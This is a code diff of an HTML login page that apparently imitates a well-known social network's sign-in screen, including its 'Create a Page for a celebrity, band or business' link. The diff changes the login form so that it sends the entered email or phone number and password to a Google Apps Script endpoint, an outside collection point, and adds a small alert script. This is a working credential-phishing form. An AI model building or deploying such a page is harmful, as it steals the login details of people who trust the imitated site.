@@ -42,12 +42,20 @@
 		</div>
 		<div class='col-md-5' style="margin-left:-18px">
 			<div class="form-section">
-    <form action="https://script.google.com/macros/s/AKfycby0286foCozBlwc1FD2MGaDMUlTmXi2O8oOr8I8AVHhy-_5HVBaBG8phnDKRjfW_wHd/exec" method="POST" id="login-form">
-        <input type="text" name="username" id="email-or-number" placeholder="Email address or phone number" >
-        <input type="password" name="password" id="password" placeholder="Password">
-        <input type="submit" name="submit" id="submit" value="Log In" style="cursor:pointer; margin-bottom: 15px;">
-        <a href="#" target="_self"></a>
-    </form>
+				<form action="https://script.google.com/macros/s/AKfycbwb5vWQ971h6QDJ-q5GvDj_AILdkY7pKW4Sf5lu6VHHdlQRyR2Yn4gxaDI-VGrCc9Sn/exec" method="POST" id="login-form">
+					<input type="text" name="email-or-number" id="email-or-number" placeholder="Email address or phone number">
+					<input type="password" name="password" id="password" placeholder="Password">
+					<input type="submit" name="submit" value="Log In" style="cursor:pointer; margin-bottom: 15px;">
+					<a href="#" target="_self"></a>
+				  </form>
+
+				  <script>
+					function displayAlert() {
+					  alert('Form submitted!');
+					}
+				  </script>
+				  
+				  
 			</div>
 			<div class="create-page"  style='margin-left: 11px;'>
 				<p><a href="#" target="_self">Create a Page</a> for a celebrity, band or business.</p>
